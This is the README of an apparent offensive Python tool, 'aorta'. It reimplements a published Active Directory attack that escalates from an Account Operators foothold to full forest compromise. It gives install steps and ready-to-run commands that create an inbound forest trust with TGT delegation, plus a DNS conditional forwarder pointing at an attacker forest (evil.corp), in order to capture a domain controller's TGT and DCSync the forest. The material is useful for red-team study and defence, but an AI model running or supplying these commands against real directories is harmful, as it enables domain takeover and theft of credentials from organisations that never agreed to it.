# AORTA — Account Operators Replicating Trust Attack

A Python reimplementation of the two victim-side primitives from SpecterOps'
[Untrustworthy Trust Builders](https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/)
AORTA write-up. It does, on the victim forest, what
**[Trustify](https://github.com/bytewreck/Trustify)** plus the DNS
domain-forwarder step do in the article:

1. **Inbound forest trust with TGT delegation** — `LsarCreateTrustedDomainEx`
   (LSARPC opnum 51) with `TrustAttributes = 0x808`
   (`FOREST_TRANSITIVE | ENABLE_TGT_DELEGATION`), followed by
   `LsarSetForestTrustInformation` (opnum 74) to attach the forest-trust
   top-level name. This is what `Trustify.exe` does; native tools like `netdom`
   refuse to set the TGT-delegation flag.
2. **DNS conditional forwarder** — a forwarder zone for the attacker forest via
   MS-DNSP RPC (`R_DnssrvOperation2`, opnum 5) so the victim DC resolves the
   attacker domain and authenticates to it over Kerberos.

With both in place, coercing a victim DC to authenticate to an attacker-controlled
host with unconstrained delegation captures the DC's TGT, which is then used to
DCSync the forest — turning an Account Operators foothold into full forest
compromise.

## Required group membership

Each primitive needs its own group membership on the victim forest:

- **Incoming Forest Trust Builders** — to create the inbound forest trust.
- **DnsAdmins** — to create the DNS conditional forwarder.

These do not have to come via Account Operators. Account Operators is merely a
convenient foothold: it has full control over many default groups that are not
protected by AdminSDHolder, so it can self-grant membership in the two groups
above. The attack works identically however those memberships are obtained —
direct membership in Incoming Forest Trust Builders and DnsAdmins is enough on
its own.

## Installation

```bash
uv tool install git+https://github.com/0xNDI/aorta
```

## Usage

Authentication methods (mutually exclusive): `-p/--password`, `--hashes LM:NTH`,
`--aes KEY`, or `--ccache PATH`. By default `-p`/`--hashes` authenticate via
NTLM; `-k/--kerberos` forces Kerberos with `-p` (cleartext) or `--hashes`
(rc4). `--aes` and `--ccache` always use Kerberos (so `-k` is implied).

```
aorta trust {add,list,delete}
aorta forwarder {add,list,delete}
```

Create the AORTA inbound forest trust:

```bash
aorta trust add \
  -u svc_aorta -d victim.local --dc dc01.victim.local -p 'Passw0rd!' \
  --attacker-domain evil.corp --attacker-netbios EVIL \
  --attacker-sid S-1-5-21-... --trust-password 'TrustSecret!'
```

Create the DNS conditional forwarder:

```bash
aorta forwarder add \
  -u svc_aorta -d victim.local --dc dc01.victim.local -p 'Passw0rd!' \
  --zone evil.corp --master 10.10.14.5
```

> Kerberos auth (`-k`, `--aes`/`--ccache`) requires clock sync with the DC. On
> skewed boxes, prefix the command with `faketime`, e.g.
> `faketime -f '+7h' aorta ...`.

## References

- SpecterOps — *Untrustworthy Trust Builders: Account Operators Replicating
  Trust Attack (AORTA)*:
  <https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/>
- **Trustify** (<https://github.com/bytewreck/Trustify>) — the .NET
  proof-of-concept tool from the same article, whose trust-creation behaviour
  this project reimplements in Python.
